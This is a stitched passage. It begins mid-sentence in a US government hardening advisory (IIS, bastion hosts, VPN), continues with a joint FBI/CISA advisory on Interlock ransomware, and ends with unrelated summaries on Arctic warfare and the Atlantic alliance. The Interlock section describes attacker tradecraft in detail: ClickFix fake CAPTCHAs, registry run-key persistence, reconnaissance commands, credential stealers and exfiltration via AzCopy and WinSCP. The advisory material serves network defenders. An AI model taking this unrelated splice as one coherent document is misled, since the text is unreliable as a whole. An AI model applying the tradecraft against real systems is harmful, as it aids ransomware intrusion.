hosts for all activities . Capture detailed records of login attempts [ CPG 2.G ], commands executed (with command arguments enabled), configurations changed, and files transferred. Integrate bastion hosts with a centralized SIEM ( NIST SP 800-137 ). Continuously monitor logs for early detection of anomalous activities. Configure the SIEM to generate automatic alerts for suspicious activity and implement behavior analysis techniques to detect anomalies. Securely store log backups and use tamper resistant storage&nbsp; [ CPG 2.U ] to prevent a threat actor from altering or purging logs to conceal malicious activity. For additional guidance on logging, see joint guidance Best Practices for Event Logging and Threat Detection . Securely Configure HTTPS Bindings and LocalSqlServer Connection String Enforce both client certificate verification and secure renegotiation in IIS by configuring the sslFlags setting to “3” in the ApplicationHost.config file. Setting sslFlags=“3” requires clients to present valid X.509 certificates for authentication and implements the TLS Renegotiation Indication Extension (RFC 5746). To implement this, perform the following steps: Locate the &lt;binding&gt; element for the HTTPS site within ApplicationHost.config . Set the sslFlags attribute to “3” : &lt;binding protocol=“https” bindingInformation=“*:443:” sslFlags=“3” /&gt; . Restart IIS to apply the changes: iisreset . Restrict the server to use only secure and up-to-date SSL/TLS protocols and cipher suites. Disable deprecated protocols like SSL 2.0, SSL 3.0, TLS 1.0, and TLS 1.1 to prevent protocol downgrade attacks that compromise the confidentiality and integrity of data. Override the global settings in&nbsp; machine.config by modifying each application’s web.config file to define its own connection strings and providers. This isolates applications at the database level and allows for tailored security configurations for each application. Create dedicated SQL Server database accounts for each application with permissions limited to necessary operations&nbsp; (e.g., SELECT, INSERT, UPDATE), and avoid granting excessive privileges. Do not assign roles like db_owner or sysadmin to application accounts. This reduces the risk of privilege escalation and enhances accountability through segregated access logs. Use&nbsp; machine.config only for configurations that must be applied globally across all applications on the server. Audit the machine.config file to ensure no application-specific settings are present. Enforce Strong Password Policies Implement a system-enforced policy that requires a minimum password length of 15 or more characters for all password-protected IT assets and all OT assets, when technically feasible [ CPG 2.B ]. Consider leveraging passphrases and password managers to make it easier for users to maintain sufficiently long passwords. In instances where minimum password lengths are not technically feasible, apply and record compensating controls, such as rate-limiting login attempts, account lockout thresholds, and strong network segmentation . Prioritize these systems for upgrade or replacement. Implement MFA [ CPG 2.H ] in addition to strong passwords (i.e., passwords 15 characters or longer). Additional Mitigation Recommendations to Strengthen Cybersecurity CISA and USCG recommend critical infrastructure organizations implement the following additional mitigations (not tied to specific findings from the engagement) to improve the cybersecurity of their IT and OT environments: Secure RDP from the IT to OT environments by deploying dedicated VPNs for all remote interactions with the OT network . Using RDP without strong authentication practices can lead to credential theft. Additionally, RDP does not inherently segregate or closely monitor user sessions, which can allow a compromised session to affect other parts of the network. Deploy VPNs with strong encryption protocols such as SSL/TLS or Internet Protocol Security (IPsec) [ CPG 2.K ] to safeguard data integrity and confidentiality; use MFA [ CPG 2.H ] at all VPN access points to ensure only authorized personnel can gain access. Configure VPN gateways to perform rigorous security checks and manage traffic destined for the OT network , ensuring comprehensive validation of all communications through pre-defined security policies. VPN gateways should function as the primary enforcement points for access controls, scrutinizing every data packet to detect and block unauthorized access attempts. Align the VPN traffic monitoring with the DMZ’s capabilities to regulate and inspect the data flow between IT and OT environments . As part of the broader network architecture review, ensure the VPN infrastructure is correctly segmented from other network resources [ CPG 2.F ] to prevent any spillover effects from the IT environment to the OT network, containing potential breaches within isolated network zones. Within the VPN configuration, enforce strict routing rules that require all remote access requests to pass through the DMZ and be authenticated by bastion hosts . This minimizes the risk of unauthorized access and ensures that all remote interactions with the OT network are monitored and controlled. If wireless technology is employed within the OT environment, implement Wi-fi Protected Access 3 (WPA3)-Enterprise encryption with strong authentication protocols like Extensible Authentication Protocol (EAP)-TLS to ensure data confidentiality and integrity. Deploy and continuously monitor Wireless Intrusion Prevention Systems (WIPS) to detect, prevent, and respond to unauthorized access attempts and anomalous activities within the wireless network infrastructure. Disable unnecessary features like Service Set Identifier (SSID) broadcasting and peer-to-peer networking, enable Media Access Control (MAC) filtering as an additional layer, and keep wireless firmware updated. Validate Security Controls In addition to applying mitigations, CISA and USCG recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. CISA and USCG recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory. To get started: Select an ATT&amp;CK technique described in this advisory (see Table 1 to Table 9 ). Align your security technologies against the technique. Test your technologies against the technique. Analyze your detection and prevention technologies’ performance. Repeat the process for all security technologies to obtain a set of comprehensive performance data. Tune your security program—including people, processes, and technologies—based on the data generated by this process. CISA and USCG recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.

**Summary:** Summary Note : This joint Cybersecurity Advisory is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources. The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), Department of Health and Human Services (HHS), and Multi-State Information Sharing and Analysis Center (MS-ISAC)—hereafter referred to as “the authoring organizations”—are releasing this joint advisory to disseminate known Interlock ransomware IOCs and TTPs identified through FBI investigations (as recently as June 2025) and trusted third-party reporting. The Interlock ransomware variant was first observed in late September 2024, targeting various business, critical infrastructure, and other organizations in North America and Europe. FBI maintains these actors target their victims based on opportunity, and their activity is financially motivated. FBI is aware of Interlock ransomware encryptors designed for both Windows and Linux operating systems; these encryptors have been observed encrypting virtual machines (VMs) across both operating systems. FBI observed actors obtaining initial access via drive-by download from compromised legitimate websites, which is an uncommon method among ransomware groups. Actors were also observed using the ClickFix social engineering technique for initial access, in which victims are tricked into executing a malicious payload under the guise of fixing an issue on the victim’s system. Actors then use various methods for discovery, credential access, and lateral movement to spread to other systems on the network. Interlock actors employ a double extortion model in which actors encrypt systems after exfiltrating data, which increases pressure on victims to pay the ransom to both get their data decrypted and prevent it from being leaked.&nbsp; FBI, CISA, HHS, and MS-ISAC encourage organizations to implement the recommendations in the Mitigations section of this advisory to reduce the likelihood and impact of Interlock ransomware incidents.

See the MITRE ATT&amp;CK Tactics and Techniques section of this advisory for tables mapped to the threat actors’ activity. Overview Since September 2024, Interlock ransomware actors have impacted a wide range of businesses and critical infrastructure sectors in North America and Europe. These actors are opportunistic and financially motivated in nature and employ tactics to infiltrate and disrupt the victim’s ability to provide their essential services.&nbsp; Interlock actors leverage a double extortion model, in which they both encrypt and exfiltrate victim data. Ransom notes do not include an initial ransom demand or payment instructions; instead, victims are provided with a unique code and are instructed to contact the ransomware group via a .onion URL through the Tor browser. To date, Interlock actors have been observed encrypting VMs, leaving hosts, workstations, and physical servers unaffected; however, this does not mean they will not expand to these systems in the future. To counter Interlock actors’ threat to VMs, enterprise defenders should implement robust endpoint detection and response (EDR) tooling and capabilities. The authoring agencies are aware of emerging open-source reporting detailing similarities between the Rhysida and Interlock ransomware variants. 1 For additional information on Rhysida ransomware, see the joint advisory, #StopRansomware: Rhy sida Ransomware . Initial Access FBI has observed Interlock actors obtaining initial access [ TA0001 ] via drive-by download [ T1189 ] from compromised legitimate websites, an atypical method for ransomware actors. Interlock ransomware methods for initial access have previously disguised malicious payloads as fake Google Chrome or Microsoft Edge browser updates, though a cybersecurity company recently reported a shift to payload filenames masquerading as updates for common security software (see Table 5 for a list of filenames). 2 In some instances, FBI has observed Interlock actors using the ClickFix social engineering technique, in which unsuspecting users are prompted to execute a malicious payload by clicking a fake Completely Automated Public Turing test to tell Computers and Humans Apart (CAPTCHA) [ T1189 ]. The CAPTCHA contains instructions for users to open the Windows Run window, paste the clipboard contents, and then execute a malicious Base64-encoded PowerShell process [ T1204.004 ]. 3 Note : This ClickFix technique has been used in several other malware campaigns, including Lumma Stealer and DarkGate. 4 Execution and Persistence Based on FBI investigations, the fake Google Chrome browser executable functions as a remote access trojan (RAT) [ T1105 ] designed to execute a PowerShell script [ T1059.001 ] that drops a file into the Windows Startup folder. From there, the file is designed to run the RAT every time the victim logs in [ T1547.001 ], establishing persistence [ TA0003 ].&nbsp; FBI also observed instances in which Interlock actors executed a PowerShell command designed to establish persistence via a Windows Registry key modification [ T1547.001 ]. To do so, Interlock actors used a PowerShell command [ T1059.001 ] designed to add a run key value named “Chrome Updater” [ T1036.005 ] that uses a specific log file as an argument upon user login. Reconnaissance To facilitate reconnaissance, a PowerShell script executes a series of commands [ T1059.001 ] designed to gather information on victim machines (see Table 1 ). Table 1. PowerShell Commands for Reconnaissance PowerShell Command Description WindowsIdentity.GetCurrent() Returns a WindowsIdentity object that represents the current Windows user [ T1033 ]. systeminfo Displays detailed configuration information [ T1082 ] about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties. tasklist/svc Lists unabridged service information [ T1007 ] for each process currently running on the local computer. Get-Service Gets objects that represent the services [ T1007 ] on a computer, including running and stopped services. Get-PSDrive Gets the drives [ T1082 ] in the current session, such as: Windows logical drives on the computer, including drives mapped to network shares. Drives exposed by PowerShell providers. Session-specified temporary drives and persistent mapped network drives. &nbsp; arp -a Displays and modifies entries in the Address Resolution Protocol (ARP) cache table [ T1016 ], which contains entries on the IPv4 and IPv6 addresses on host endpoints. Command and Control FBI observed Interlock actors using command and control (C2) [ TA0011 ] applications like Cobalt Strike and SystemBC. Interlock actors also used Interlock RAT 5 and NodeSnake RAT (as of March 2025) 6 for C2 and executing commands. Credential Access, Lateral Movement, and Privilege Escalation FBI observed that once Interlock actors establish remote control of a compromised system, they use a series of PowerShell commands to download a credential stealer ( cht.exe ) [ TA0006 ] and keylogger binary ( klg.dll ) [ T1056.001 ],[ T1105 ]. According to open source reporting, the credential stealer collects login information and associated URLs for victims’ online accounts [ T1555.003 ], while the keylogger dynamic link library (DLL) logs users’ keystrokes in a file named conhost.txt [ T1036.005 ]. 7 As of February 2025, private cybersecurity analysts also observed Interlock ransomware infections executing different versions of information stealers [ TA0006 ], including Lumma Stealer 8 and Berserk Stealer, to harvest credentials for lateral movement and privilege escalation [ T1078 ]. 9 Interlock actors leverage compromised credentials and Remote Desktop Protocol (RDP) 10 [ T1021.001 ] to move between systems. They also use tools like AnyDesk to enable remote connectivity and PuTTY to assist with lateral movement [ T1219 ]. 11 In addition to stealing users’ online credentials, Interlock actors have compromised domain administrator accounts (possibly by using a Kerberoasting attack [ T1558.003 ]) 12 to gain additional privileges [ T1078.002 ].&nbsp; Collection and Exfiltration Interlock actors leverage Azure Storage Explorer ( StorageExplorer.exe ) to navigate victims’ Microsoft Azure Storage accounts [ T1530 ] prior to exfiltrating data. According to open source reporting, Interlock actors execute AzCopy to exfiltrate data by uploading it to the Azure storage blob [ T1567.002 ]. 13 Interlock actors also exfiltrate data over file transfer tools, including WinSCP [ T1048 ]. Impact Following data exfiltration, Interlock actors deploy the encryption binary as a 64-bit executable named conhost.exe [ T1486 ],[ T1036.005 ]. FBI has observed Interlock ransomware encryptors for both Windows and Linux operating systems. Encryptors are designed to encrypt files using a combined Advanced Encryption Standard (AES) and Rivest-Shamir-Adleman (RSA) algorithm. In addition, cybersecurity researchers have identified Interlock ransomware samples using a FreeBSD ELF encryptor [ T1486 ], a departure from usual Linux encryptors designed for VMware ESXi servers and VMs. 14 A cybersecurity company identified a DLL binary named tmp41.wasd —executed after encryption using rundll32.exe [ T1218.011 ]—which uses the remove() function to delete the encryption binary [ T1070.004 ]; 15 on Linux machines, the encryptor uses a similar technique to execute the removeme function.&nbsp; Encrypted files are appended with either a .interlock or .1nt3rlock file extension, alongside a ransom note titled !__README__!.txt delivered via group policy object (GPO). Interlock actors use a double-extortion model [ T1657 ], encrypting systems after exfiltrating data. The ransom note provides each victim with a unique code and instructions to contact the ransomware actors via a .onion URL.&nbsp; Interlock actors do not leave an initial ransom demand or payment instructions on compromised networks, and do not relay this information until contacted by the victim. The actors instruct victims to make ransom payments in Bitcoin to cryptocurrency wallet addresses provided by the actors. The actors threaten to publish the victim’s exfiltrated data to their leak site on the Tor network unless the victim pays the ransom demand; the actors have previously followed through on this threat. 16 Leveraged Tools See Table 2 for publicly available tools and applications used by Interlock ransomware actors. This includes legitimate tools repurposed for their operations. Disclaimer : Use of these tools and applications should not be attributed as malicious without analytical evidence to support threat actor use and/or control. Table 2. Tools Used by Interlock Ransomware Actors Tool Name Description AnyDesk A common legitimate remote monitoring and management (RMM) tool maliciously used by Interlock actors to obtain remote access and maintain persistence. AnyDesk also supports remote file transfer. Cobalt Strike A penetration testing tool used by security professionals to test the security of networks and systems. PowerShell A cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS. PSExec A tool designed to run programs and execute commands on remote systems. PuTTY.exe An open source file transfer application commonly used to remotely connect to systems via Secure Shell (SSH). PuTTY also supports file transfer protocols like Secure File Transfer Protocol (SFTP) and Secure Copy Protocol (SCP). ScreenConnect A remote support, access, and meeting software that allows users to control devices remotely over the internet. CISA observed Interlock actors using a cracked version of this software in at least one incident. These versions may be standalone versions not connecting to ScreenConnect’s official cloud domains (domains available upon request from ConnectWise). SystemBC Enables Interlock actors to compromise systems, run commands, download malicious payloads, and act as a proxy tool to the actors’ C2 servers. Windows Console Host Windows Console Host ( conhost.exe ) manages the user interface for command-line applications in Windows, including Command Prompt and PowerShell.&nbsp; WinSCP A free and open source SSH File Transfer Protocol (FTP), WebDAV, Amazon S3, and secure copy protocol client. Leveraged Files See Table 3 and Table 4 for files used by Interlock ransomware actors. These were obtained from FBI investigations as recently as June 2025. Disclaimer : Some of the hashes are for legitimate tools and applications and should not be attributed as malicious without analytical evidence to support threat actor use and/or control.

For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s Best Practices for MITRE ATT&amp;CK Mapping and CISA’s Decider Tool . Table 5. Initial Access Technique Title ID Use Drive-By Compromise T1189 Interlock actors obtain initial access by compromising a legitimate website that network users visit, or by disguising malicious payloads as fake browser updates or common security software, including the following: 17 FortiClient.exe Ivanti-Secure-Access-Client.exe GlobalProtect.exe Webex.exe AnyConnectVPN.exe Cisco-Secure-Client.exe zyzoom_antimalware.exe Interlock actors also gain access via the ClickFix social engineering technique, in which users are tricked into executing a malicious payload by clicking on a fake CAPTCHA that prompts users to execute a malicious PowerShell script.&nbsp; &nbsp; Table 6. Execution Technique Title ID Use Command and Scripting Interpreter: PowerShell T1059.001&nbsp; Interlock actors implement PowerShell scripts to drop a malicious file into the Windows Startup folder. Interlock actors execute a PowerShell command for registry key modification. Interlock actors use a PowerShell script to execute a series of commands to facilitate reconnaissance. User Execution: Malicious Copy and Paste T1204.004 Via the ClickFix social engineering technique, users are tricked into clicking a fake CAPTCHA and prompted into executing a malicious Base64-encoded PowerShell process by following instructions to open a Windows Run window (Windows Button + R), pasting clipboard contents (“CTRL + V”), and then executing the malicious script (“Enter”). Table 7. Persistence Technique Title ID Use Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder T1547.001 Interlock actors establish persistence by adding a file into a Windows StartUp folder that executes a RAT every time a user logs in. Interlock actors also implement registry key modification by using a PowerShell command to add a run key value (named “Chrome Updater”) that uses a log file as an argument every time a user logs in. &nbsp; Table 8. Privilege Escalation Technique Title ID Use Valid Accounts: Domain Accounts T1078.002 Interlock actors compromise domain administrator accounts to gain additional privileges.&nbsp; Table 9. Defense Escalation Technique Title ID Use Defense Evasion TA0005 Interlock actors execute the removeme function on Linux systems to delete the encryption binary for defense evasion.&nbsp; Masquerading: Match Legitimate Resource Name or Location T1036.005 Interlock actors disguise a malicious run key value by naming it “Chrome Updater”; the run key value uses a specific log file as an argument upon user login. Interlock actors disguise files of keystrokes logged by one of their credential stealers with a legitimate Windows filename: conhost.txt . Interlock actors disguise an encryption binary, a 64-bit executable, by giving it the same name as the legitimate Console Windows Host executable: conhost.exe System Binary Proxy Execution: Rundll32 T1218.011 Interlock actors use rundll32.exe to proxy execution of a malicious DLL binary tmp41.wasd .&nbsp; Indicator Removal: File Deletion T1070.004 Interlock actors execute a DLL binary tmp41.wasd that uses the remove() function to delete their encryption binary for defense evasion.&nbsp; Table 10. Credential Access Technique Title ID Use Credential Access TA0006 Interlock actors download credential stealer cht.exe and execute other versions information stealers (including Lumma Stealer and Berserk Stealer) to harvest credentials. Credentials from Password Stores: Credentials from Web Browsers T1555.003 Interlock actors download a credential stealer that collects login information and associated URLs for victims’ online accounts. Input Capture T1056 Interlock actors execute Lumma Stealer and Berserk Stealer information stealers on victim systems. Input Capture: Keylogging T1056.001 Interlock actors download klg.dll , a keylogger binary, onto compromised systems, where it logs users’ keystrokes in a file named conhost.txt .&nbsp; Steal or Forge Kerberos Tickets: Kerberoasting T1558.003 Interlock actors possibly use a Kerberoasting attack to compromise domain administrator accounts.&nbsp; Table 11. Discovery Technique Title ID Use System Owner/User Discovery T1033 Interlock actors execute a PowerShell command WindowsIdentity.GetCurrent() on victim systems to retrieve a WindowsIdentity object that represents the current Windows user. System Information Discovery T1082 Interlock actors execute a PowerShell command systeminfo on victim systems to access detailed configuration information about the system, including OS configuration, security information, product ID, and hardware properties. Interlock actors execute a PowerShell command Get-PSDrive on victim systems to discover the drives in the current session, such as:&nbsp; Windows logical drives on the computer, including drives mapped to network shares. Drives exposed by PowerShell providers. Session-specified temporary drives and persistent mapped network drives. System Service Discovery T1007 Interlock actors execute a PowerShell command tasklist /svc on victim systems that lists service information for each process currently running on the system.&nbsp; Actors also execute a PowerShell command Get-Service on victim systems that retrieves objects that represent the services (including running and stopped services) on the system. System Network Configuration Discovery T1016 Interlock actors execute a PowerShell command arp -a on victim systems that displays and modifies entries in the Address Resolution Protocol (ARP) cache table (which contains entries on the IPv4 and IPv6 addresses on host endpoints). Table 12. Lateral Movement Technique Title ID Use Valid Accounts T1078 Interlock actors harvest and abuse valid credentials for lateral movement and privilege escalation. Remote Services: Remote Desktop Protocol T1021.001 Interlock actors use RDP and valid credentials to move laterally between systems. Table 13. Collection Technique Title ID Use Data from Cloud Storage T1530 Interlock actors use StorageExplorer.exe , the cloud storage solution Azure Storage Explorer, to explore Microsoft Azure Storage accounts.&nbsp; Table 14. Command and Control Technique Title ID Use Command and Control TA0011 Interlock actors use applications Cobalt Strike and SystemBC for C2.&nbsp; Ingress Tool Transfer T1105 Interlock actors use a fake Google Chrome or Microsoft Edge browser update to cause users to execute a RAT on the victimized system. Interlock actors download credential stealers ( cht.exe ) and keylogger binaries ( klg.dll ) once actors establish remote control of a compromised system.&nbsp; Remote Access Tools T1219 Interlock actors use legitimate remote access tools such as AnyDesk to enable remote connectivity and PuTTY to assist with lateral movement. Table 15. Exfiltration Technique Title&nbsp; ID Use Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002 Interlock actors exfiltrate data to cloud storage by executing AzCopy to upload data to the Azure storage blob. Exfiltration Over Alternative Protocol T1048 Interlock actors use file transfer tools like WinSCP to exfiltrate data. Table 16. Impact Technique Title&nbsp; ID Use Data Encrypted for Impact T1486 Interlock actors encrypt victim data using a combined AES and RSA algorithm on compromised systems to interrupt availability to system and network resources. Actors code encryptors using C/C++. Interlock actors use encryptors for both Windows and Linux operating systems.&nbsp; Interlock actors also use a FreeBSD ELF encryptor to encrypt victim data.&nbsp; Financial Theft&nbsp;&nbsp; T1657 Interlock actors deliver a ransom note titled !__README__!.txt via a GPO which provides victims with instructions to use a .onion URL to contact the actors over the Tor network. Actors use a double-extortion model, both encrypting victim data and threatening release of victim data on their Tor network leak site if the ransom is not paid. Mitigations The authoring agencies recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture on the basis of the Interlock ransomware actors’ activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA’s CPGs webpage for more information on the CPGs, including additional recommended baseline protections. In addition to the below mitigations, Healthcare and Public Health (HPH) organizations should use HPH Sector CPGs to implement cybersecurity protections to address the most common threats and TTPs used against this sector. At-risk organizations should implement the following mitigations: Prevent Interlock ransomware actors from obtaining initial access : Implement domain name system (DNS) filtering to block users from accessing malicious sites and applications. Implement web access firewalls to mitigate and prevent unknown commands or process injection from malicious domains or websites. Train users [ CPG 2.I ] to identify, avoid, and report social engineering attempts . Implement a recovery plan [ CPG 5.A ] to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, the cloud) [ CPG 2.R ]. Require all accounts&nbsp; with password logins (e.g., service accounts, admin accounts, and domain admin accounts) to comply with NIST password standards . Require employees to use long passwords [ CPG 2.B ] and consider not requiring recurring password changes, as these can weaken security. Require MFA&nbsp; [ CPG 2.H ] for all services to the extent possible, particularly for webmail, virtual private networks (VPNs), and accounts that access critical systems. Implement ICAM policies across the organization as a precursor to MFA. Keep all operating systems, software, and firmware up to date ; prioritize patching known exploited vulnerabilities in internet-facing systems [ CPG 1.E ]. Timely patching is efficient and cost effective for minimizing an organization’s exposure to cybersecurity threats. Implement robust EDR capabilities on VMs, systems, and networks. Segment networks [ CPG 2.F ] to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement. Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware [ CPG 3.A ] with a networking monitoring tool [ CPG 2.T ]. To aid in detecting ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Implement EDR tools; these are useful for detecting lateral connections as they provide insight into common and uncommon network connections for each host. Filter network traffic by preventing unknown or untrusted origins from accessing remote services on internal systems. This prevents threat actors from directly connecting to remote access services that they have established for persistence. Install, regularly update, and enable real time detection for antivirus software&nbsp; on all hosts. Review domain controllers, servers, workstations, and active directories&nbsp; for new and/or unrecognized accounts. Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege [ CPG 2.E ]. Disable unused ports . Consider adding an email banner to emails received from outside of your organization [ CPG 2.M ]. Disable hyperlinks in received emails. Implement time-based access for accounts set at the admin level and higher;&nbsp; for example, the just-in-time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model ): This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task. Disable command line and scripting activities and permissions [ CPG 2.N ]. Disabling software utilities that run from the command line makes it more difficult for threat actors to escalate privileges and move laterally. Maintain offline backups of data and regularly maintain backups and restorations [ CPG 2.R ]; this avoids severe service interruption and irretrievable data in the event of a compromise. Ensure all backup data is encrypted, immutable&nbsp; (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [ CPG 2.R ]. Validate Security Controls In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory. To get started: Select an ATT&amp;CK technique described in this advisory (see Table 5&nbsp; through Table 16 ). Align your security technologies against the technique. Test your technologies against the technique. Analyze your detection and prevention technologies’ performance. Repeat the process for all security technologies to obtain a set of comprehensive performance data. Tune your security program, including people, processes, and technologies, based on the data generated by this process. The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.

Reporting Your organization has no obligation to respond or provide information back to FBI in response to this joint advisory. If, after reviewing the information provided, your organization decides to provide information to FBI, reporting must be consistent with applicable state and federal laws. FBI is interested in any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with threat actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. Additional details of interest include a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host- and network-based indicators. The authoring agencies do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge you to promptly report ransomware incidents to FBI’s Internet Crime Complain Center (IC3) , a local FBI Field Office , or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center ( contact@mail.cisa.dhs.gov ) or by calling 1-844-Say-CISA (1-844-729-2472). State, local, tribal, and territorial governments should report incidents to the MS-ISAC ( SOC@cisecurity.org or 866-787-4722). HPH Sector organizations should report incidents to FBI or CISA but also can reach out to HHS at HHScyber@hhs.gov for cyber incident support focused on mitigating adverse patient impacts.

**Summary:** At &#8211;40&#176;F, cold is not a condition simply to be managed. It is a constraint that governs everything. Equipment fails, humans slow, and mistakes compound. Any serious discussion of Arctic military strategy and operations needs to begin with and remain grounded in reality.Unfortunately, there is an ever-expanding discourse around Arctic security that does not do this. Spend enough time in the Arctic, in winter, in darkness, in sustained extreme cold &#8212; and the reality check arrives quickly.

**Summary:** The foundations of the Atlantic alliance are shifting in ways not seen since the early days of the Cold War. Washington is no longer simply urging greater European burden-sharing: It is redefining the terms of the alliance itself. Secretary of State Marco Rubio suggested that the era of a coherent, rules-based international system has passed. Recent U.S. talk of &#8220;taking&#8221; Greenland, and &#8220;civilizational erasure&#8221; &#8212; alongside the decision to end U.S. security assistance to Ukraine &#8212; has rattled European capitals and eroded trust as they realize that U.S. support is increasingly conditioned on ideological alignment.
